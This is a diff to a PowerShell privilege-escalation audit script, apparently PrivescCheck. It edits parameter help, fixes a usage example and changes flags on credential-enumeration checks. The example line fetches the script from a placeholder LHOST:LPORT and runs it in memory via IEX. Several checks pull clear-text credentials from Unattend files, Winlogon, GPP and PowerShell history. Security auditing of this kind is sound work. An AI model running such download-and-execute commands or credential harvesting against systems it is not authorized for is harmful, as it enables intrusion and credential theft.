@@ -30,10 +30,10 @@ function Invoke-PrivescCheck {
     Don't output test results, show only the final vulnerability report.
 
     .PARAMETER Report
-    Basename (or path + basename) of the output file report.
+    The base name of the output file report(s) (extension is appended automatically depending on the chosen file format(s)).
 
     .PARAMETER Format
-    Select the format of the output file (e.g.: TXT, HTML, CSV or XML).
+    A comma-separated list of file formats (TXT,HTML,CSV,XML).
 
     .EXAMPLE
     PS C:\Temp\> . .\PrivescCheck.ps1; Invoke-PrivescCheck
@@ -42,7 +42,7 @@ function Invoke-PrivescCheck {
     C:\Temp\>powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
 
     .EXAMPLE
-    C:\Temp\>powershell "IEX (New-Object Net.WebClient).DownloadString('http://LHOST:LPORT/PrivescCheck.ps1'; Invoke-PrivescCheck"
+    C:\Temp\>powershell "IEX (New-Object Net.WebClient).DownloadString('http://LHOST:LPORT/PrivescCheck.ps1'); Invoke-PrivescCheck"
     #>
 
     [CmdletBinding()] Param(
@@ -105,8 +105,8 @@ function Invoke-PrivescCheck {
 "CREDS_UNATTEND",                   "Invoke-UnattendFilesCheck",                    "Creds",            "Unattend Files",                       "Vuln", "Medium",   "List",     "False",    "True",         "False",        "Locate 'Unattend' files and check whether they contain any clear-text credentials."
 "CREDS_WINLOGON",                   "Invoke-WinlogonCheck",                         "Creds",            "WinLogon",                             "Vuln", "Medium",   "List",     "False",    "True",         "False",        "Parse the Winlogon registry keys and check whether they contain any clear-text password. Entries that have an empty password field are filtered out."
 "CREDS_CRED_FILES",                 "Invoke-CredentialFilesCheck",                  "Creds",            "Credential Files",                     "Info", "Info",     "List",     "True",     "False",        "False",        "Enumerate the credential files that are present in the current user's HOME folder. This is purely informative."
-"CREDS_VAULT_CRED",                 "Invoke-VaultCredCheck",                        "Creds",            "Vault Creds",                          "Info", "Info",     "List",     "False",    "True",         "False",        "Enumerate the credentials that are saved in the current user's vault."
-"CREDS_VAULT_LIST",                 "Invoke-VaultListCheck",                        "Creds",            "Vault List",                           "Info", "Info",     "List",     "False",    "True",         "False",        "Enumerate the web credentials that are saved in the current user's Vault."
+"CREDS_VAULT_CRED",                 "Invoke-VaultCredCheck",                        "Creds",            "Vault Creds",                          "Info", "Info",     "List",     "True",     "True",         "False",        "Enumerate the credentials that are saved in the current user's vault."
+"CREDS_VAULT_LIST",                 "Invoke-VaultListCheck",                        "Creds",            "Vault List",                           "Info", "Info",     "List",     "True",     "True",         "False",        "Enumerate the web credentials that are saved in the current user's Vault."
 "CREDS_GPP",                        "Invoke-GPPPasswordCheck",                      "Creds",            "GPP Passwords",                        "Vuln", "Medium",   "List",     "False",    "True",         "False",        "Locate old cached Group Policy Preference files that contain a 'cpassword' field and extract the clear-text credentials."
 "CREDS_PS_HIST",                    "Invoke-PowerShellHistoryCheck",                "Creds",            "PowerShell History",                   "Info", "Info",     "List",     "True",     "True",         "False",        "Locate the current user's PowerShell history file and check whether it contains some clear-text credentials. This check is simply based on keyword matching and might not be entirely reliable."
 "HARDEN_UAC",                       "Invoke-UacCheck",                              "Hardening",        "UAC Settings",                         "Info", "Info",     "List",     "True",     "True",         "False",        "Retrieve the User Access Control (UAC) configuration and check whether it is enabled."
